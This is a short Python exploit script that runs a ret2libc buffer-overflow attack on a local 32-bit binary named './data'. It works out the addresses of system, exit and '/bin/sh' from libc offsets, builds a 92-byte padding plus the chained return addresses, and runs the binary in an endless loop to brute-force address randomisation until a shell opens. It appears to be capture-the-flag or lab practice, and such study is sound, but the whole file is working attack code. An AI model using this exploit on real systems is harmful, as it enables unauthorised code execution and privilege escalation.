#from pwn import *
from struct import pack
from subprocess import call
import signal, sys

def def_handler(sig, frame):
    print("\n\n[!] se tenso.. \n\n")
    sys.exit(-1)


signal.signal(signal.SIGINT, def_handler)

libc_add = 0xb7d8e000

offset = 92

#readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
 #  150: 00033990    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
#  1537: 00041040    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

#strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
# 188338 /bin/sh
junk = b'A'*offset

system_addr_offset =0x00041040 
exit_addr_offset = 0x00033990
bin_sh_addr_offset = 0x00188338 


system_addr = pack("<L", libc_add+system_addr_offset)
exit_addr = pack("<L", libc_add + exit_addr_offset)
bin_sh_addr = pack("<L", libc_add + bin_sh_addr_offset)

payload = junk + system_addr + exit_addr + bin_sh_addr

while True:
    ret = call(["./data", payload])
